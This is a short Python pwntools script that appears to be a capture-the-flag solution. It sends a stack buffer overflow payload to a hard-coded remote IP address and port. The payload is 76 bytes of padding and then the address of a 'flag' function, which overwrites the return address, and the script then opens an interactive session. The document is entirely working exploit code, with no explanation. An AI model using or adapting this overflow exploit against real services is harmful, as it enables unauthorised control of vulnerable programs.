from pwn import *

def exploit():
    r = remote("124.16.75.117", 51001)

    offset = 0x4C  # 偏移量 0x48+4=76字节
    flag_addr = 0x80491F6 # flag函数地址

    payload = b"a" * offset + p32(flag_addr)
    
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    exploit()